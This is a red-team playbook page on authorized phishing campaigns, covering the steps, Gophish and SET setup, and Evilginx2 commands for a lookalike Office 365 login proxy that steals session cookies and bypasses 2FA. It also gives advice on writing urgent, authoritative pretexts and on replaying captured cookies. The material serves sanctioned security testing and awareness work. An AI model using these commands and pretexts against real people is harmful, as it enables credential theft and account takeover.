# Phishing — Email Campaigns

## When this applies

Authorized assessment to measure click rate / credential capture / 2FA bypass against an organization. Used for awareness training, baselining, or as the first step of a red team engagement.

## Technique

Mass or targeted email campaigns delivering a credential-capture page or tracked link. Variants: mass phishing, spear phishing (per-target), whaling (executives), clone phishing (legitimate copy with replaced links). Modern campaigns often pair credential capture with reverse-proxy frameworks for 2FA bypass.

**MITRE ATT&CK**: T1566.001 (Spearphishing Attachment), T1566.002 (Spearphishing Link).

## Steps

1. Define scope and rules of engagement (target lists, allowed pretexts, kill-switch).
2. Develop pretext aligned to the org (IT alert, HR update, vendor notice).
3. Acquire infrastructure: lookalike domain, SMTP, TLS cert, sending profile.
4. Build landing page (cred capture or 2FA-relay) and email template.
5. Send campaign; collect engagement metrics (delivered, opened, clicked, submitted).
6. Validate captures, document, debrief, and run awareness training.

### Gophish quick-start

```bash
./gophish
# admin UI: https://127.0.0.1:3333  default admin:gophish
# 1) Sending Profile (SMTP)
# 2) Landing Page (cred capture)
# 3) Email Template
# 4) User Groups (targets)
# 5) Launch Campaign + dashboard
```

### Social-Engineer Toolkit (SET)

```
setoolkit
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
   3) Credential Harvester Attack Method
      2) Site Cloner   # enter target URL + listening IP
```

### Evilginx2 (reverse-proxy 2FA bypass)

```bash
./evilginx2 -p phishlets/
phishlets hostname office365 login.office365-secure.com
phishlets enable office365
lures create office365
lures edit 0 redirect_url https://office.com
lures get-url 0
sessions
```

### Email template guidance

```
Subject — urgency ("Immediate Action Required"), authority ("IT Security Alert"), personalised
Body    — clean formatting, branding, plausible pretext, single clear CTA
Avoid   — generic greetings, broken grammar, mismatched URLs, unusual asks for raw credentials
```

## Verifying success

- Tracker pixel + landing page logs show open / click / submission counts.
- Captured credentials validated (do not reuse: check via passive auth, e.g. is_authenticated probe).
- For Evilginx: `sessions` shows active session cookies; verify by replaying cookie into authenticated request, never to make destructive changes.

## Common pitfalls

- Launching from a domain reputation that is too "fresh" → SPF/DKIM/DMARC failures and quarantining.
- Overly aggressive pretext that triggers SOC alerting before metrics complete.
- Forgetting to coordinate with mail-team allow-listing during the test window.
- Not redacting captured passwords in the post-engagement report.

## Tools

- Gophish (https://www.getgophish.com/)
- Social-Engineer Toolkit (SET)
- King Phisher
- Evilginx2 (2FA reverse proxy)
- Modlishka (reverse proxy)
- CredSniper
